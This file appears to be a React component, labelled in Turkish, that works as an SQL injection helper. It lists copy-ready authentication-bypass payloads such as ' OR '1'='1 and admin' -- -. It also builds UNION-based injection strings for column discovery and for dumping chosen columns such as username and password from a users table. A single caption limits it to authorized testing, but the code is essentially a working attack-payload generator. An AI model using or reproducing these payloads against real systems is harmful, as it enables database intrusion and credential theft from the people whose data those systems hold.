import { useState } from 'react';
import { copyText } from './copy';

// SQLi yardimcisi — auth bypass listesi + UNION sutun ureteci.
// Sutun sayisini ver, ORDER BY kesif + UNION SELECT sablonunu al.
const BYPASS = [
  `' OR '1'='1`,
  `' OR '1'='1' -- -`,
  `admin' -- -`,
  `' UNION SELECT NULL-- -`,
  `" OR ""="`,
  `' OR 1=1 LIMIT 1-- -`,
];

export default function SqliHelper() {
  const [cols, setCols] = useState('3');
  const [table, setTable] = useState('users');
  const [col, setCol] = useState('username,password');
  const [copied, setCopied] = useState<string | null>(null);

  const n = Math.max(1, Math.min(20, Number(cols) || 3));
  const seq = Array.from({ length: n }, (_, i) => i + 1).join(',');
  const union = `' UNION SELECT ${seq}-- -`;
  const dump = `' UNION SELECT ${seq} FROM ${table.trim() || 'users'}-- -`;
  const cols2 = col.split(',').map((c) => c.trim()).filter(Boolean);

  const copy = async (v: string) => {
    if (await copyText(v)) { setCopied(v); setTimeout(() => setCopied(null), 1000); }
  };
  const Line = ({ v, tag }: { v: string; tag?: string }) => (
    <button key={v + tag} onClick={() => copy(v)} title="Kopyalamak icin tikla"
      className="block w-full truncate rounded-lg bg-[#141414] px-3 py-1.5 text-left font-mono text-[12px] text-[#DDD] hover:text-white">
      {copied === v ? <span className="text-[#30D158]">kopyalandı ✓</span> : <>{tag && <span className="text-[#666]">[{tag}] </span>}{v}</>}
    </button>
  );

  return (
    <div className="rounded-2xl border border-[#1E1E1E] bg-[#0A0A0A] p-5">
      <h3 className="text-[14px] font-bold text-white">SQLi Yardımcısı</h3>
      <p className="mt-1 text-[12px] text-[#888]">Sadece yetkili testlerde. Önce sütun sayısını ORDER BY ile bul, sonra UNION kur.</p>
      <div className="mt-3">
        <p className="text-[12px] text-[#888]">Auth bypass</p>
        <div className="mt-1 space-y-1.5">{BYPASS.map((b) => <Line key={b} v={b} />)}</div>
      </div>
      <div className="mt-4 border-t border-[#1E1E1E] pt-3">
        <p className="text-[12px] text-[#888]">UNION kurucu</p>
        <div className="mt-2 flex flex-wrap gap-2">
          <label className="flex items-center gap-1.5 text-[12px] text-[#AAA]">sütun
            <input value={cols} onChange={(e) => setCols(e.target.value)} inputMode="numeric" aria-label="Sutun sayisi"
              className="w-14 rounded-lg border border-[#2A2A2A] bg-[#1A1A1A] px-2 py-1.5 font-mono text-[12px] text-white outline-none" />
          </label>
          <label className="flex items-center gap-1.5 text-[12px] text-[#AAA]">tablo
            <input value={table} onChange={(e) => setTable(e.target.value)} aria-label="Tablo adi"
              className="w-28 rounded-lg border border-[#2A2A2A] bg-[#1A1A1A] px-2 py-1.5 font-mono text-[12px] text-white outline-none" />
          </label>
          <label className="flex items-center gap-1.5 text-[12px] text-[#AAA]">kolonlar
            <input value={col} onChange={(e) => setCol(e.target.value)} aria-label="Kolon adlari"
              className="w-44 rounded-lg border border-[#2A2A2A] bg-[#1A1A1A] px-2 py-1.5 font-mono text-[12px] text-white outline-none" />
          </label>
        </div>
        <div className="mt-2 space-y-1.5">
          <Line v={`' ORDER BY ${n}-- -`} tag="kesif" />
          <Line v={union} tag="union" />
          <Line v={dump} tag="dokum" />
          {cols2.length > 0 && <Line v={`' UNION SELECT ${cols2.join(',')} FROM ${table.trim() || 'users'}-- -`} tag="hedefli" />}
        </div>
      </div>
    </div>
  );
}
